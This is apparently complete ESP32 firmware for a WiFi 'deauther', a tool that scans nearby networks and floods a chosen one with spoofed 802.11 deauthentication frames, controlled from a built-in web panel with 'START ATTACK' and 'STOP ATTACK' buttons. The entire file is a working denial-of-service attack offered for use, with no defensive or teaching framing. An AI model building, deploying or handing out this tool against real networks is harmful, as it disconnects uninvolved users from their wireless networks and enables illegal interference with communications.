#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>

const char* ap_ssid = "ESP32_Deauther";
const char* ap_password = "12345678";
WebServer server(80);

bool attack = false;
uint8_t target[6] = {0};
uint8_t channel = 1;
int pkt = 0;

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t seq_ctrl;
  uint8_t reason;
} __attribute__((packed)) deauth_frame;

void send_deauth() {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  deauth_frame frame;
  frame.frame_ctrl = 0x00C0;
  frame.duration = 0x013A;
  memset(frame.dest, 0xFF, 6);
  memcpy(frame.src, target, 6);
  memcpy(frame.bssid, target, 6);
  frame.seq_ctrl = 0x1000;
  frame.reason = 0x07;
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&frame, sizeof(frame), false);
  pkt++;
  delay(1);
}

const char html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head><title>Deauther</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#1a1a2e;color:white;padding:20px}.card{background:#16213e;padding:20px;margin:10px 0;border-radius:10px}button{padding:10px 20px;margin:5px;border-radius:5px;border:none;cursor:pointer}.start{background:#e94560;color:white}.stop{background:#dc3545;color:white}.scan{background:#28a745;color:white}select{width:100%;padding:10px;margin:10px 0}</style>
</head>
<body>
<h1>ESP32 Deauther</h1>
<div class="card"><h2>Status</h2>
<div id="status" style="background:#28a745;padding:10px;border-radius:5px">STOPPED</div>
<div id="pcount">Packets: 0</div>
</div>
<div class="card"><h2>Target</h2>
<button class="scan" onclick="scan()">Scan Networks</button>
<select id="target"></select>
</div>
<div class="card">
<button class="start" onclick="startAttack()">START ATTACK</button>
<button class="stop" onclick="stopAttack()">STOP ATTACK</button>
</div>
<script>
function update(){fetch('/status').then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML=d.running?'RUNNING':'STOPPED';document.getElementById('status').style.background=d.running?'#dc3545':'#28a745';document.getElementById('pcount').innerHTML='Packets: '+d.packets;});}
function scan(){fetch('/scan').then(r=>r.json()).then(d=>{let sel=document.getElementById('target');sel.innerHTML='<option>Select target</option>';d.networks.forEach(n=>{let opt=document.createElement('option');opt.value=n.bssid+','+n.channel;opt.text=n.ssid+' ('+n.bssid+') CH:'+n.channel;sel.appendChild(opt);});});}
function startAttack(){let val=document.getElementById('target').value;if(!val||val=='Select target'){alert('Scan dulu!');return;}fetch('/start',{method:'POST',body:val});}
function stopAttack(){fetch('/stop',{method:'POST'});}
setInterval(update,1000);
</script>
</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_password);
  esp_wifi_set_promiscuous(true);
  
  server.on("/", [](){ server.send(200, "text/html", html); });
  server.on("/status", [](){ server.send(200, "application/json", "{\"running\":" + String(attack) + ",\"packets\":" + pkt + "}"); });
  server.on("/scan", [](){ 
    int n = WiFi.scanNetworks();
    String json = "{\"networks\":[";
    for(int i=0;i<n;i++){
      if(i>0) json+=",";
      json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",\"channel\":" + WiFi.channel(i) + "}";
    }
    json += "]}";
    WiFi.scanDelete();
    server.send(200, "application/json", json);
  });
  server.on("/start", HTTP_POST, [](){ 
    String s = server.arg(0);
    sscanf(s.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx,%hhu", 
      &target[0], &target[1], &target[2], &target[3], &target[4], &target[5], &channel);
    attack = true;
    server.send(200, "text/plain", "OK");
  });
  server.on("/stop", HTTP_POST, [](){ attack = false; server.send(200, "text/plain", "OK"); });
  server.begin();
}

void loop() {
  server.handleClient();
  if(attack){
    send_deauth();
    delay(50);
  }
  delay(10);
}
